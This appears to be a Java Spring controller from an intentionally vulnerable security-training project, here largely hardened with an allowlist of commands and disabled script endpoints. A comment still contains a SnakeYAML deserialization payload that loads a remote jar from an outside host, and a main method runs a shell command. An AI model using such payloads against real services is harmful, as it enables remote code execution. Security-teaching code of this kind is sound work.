package org.joychou.controller;

import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    /**
     * Fixed server-side table of runnable commands. The request value only selects a key;
     * the argv that is executed is always one of these constants.
     */
    private static final Map<String, String[]> COMMANDS;

    static {
        Map<String, String[]> m = new HashMap<>();
        m.put("date", new String[]{"date"});
        m.put("whoami", new String[]{"whoami"});
        m.put("uname", new String[]{"uname", "-a"});
        m.put("ls", new String[]{"ls", "-l"});
        COMMANDS = Collections.unmodifiableMap(m);
    }

    private static String[] lookupCommand(String key) {
        if (key == null) {
            return null;
        }
        String[] argv = COMMANDS.get(key.trim());
        return argv == null ? null : argv.clone();
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        String[] argv = lookupCommand(cmd);
        if (argv == null) {
            return "Bad boy. I got u.";
        }

        try {
            Process p = new ProcessBuilder(argv).start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));

            // Drain and discard the output so the process can finish; it is not reflected to the caller.
            while (inBr.readLine() != null) {
                // discard
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            log.error("CommandExec failed: {}", e.getClass().getSimpleName());
            return "Command exec failed!!";
        }
        return "Command executed";
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        String[] arrCmd = lookupCommand(cmd);
        if (arrCmd == null) {
            return "Bad boy. I got u.";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));

            // Drain and discard the output so the process can finish; it is not reflected to the caller.
            while (inBr.readLine() != null) {
                // discard
            }
            inBr.close();
        } catch (Exception e) {
            log.error("processBuilder failed: {}", e.getClass().getSimpleName());
            return "Command exec failed!!";
        }

        return "Command executed";
    }


    /**
     * Remote script loading was removed: request data is never evaluated as a script.
     *
     * @param jsurl ignored
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) {
        return "Script evaluation is disabled";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * Groovy evaluation of request data was removed.
     *
     * @param content ignored
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        return "Script evaluation is disabled";
    }


    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

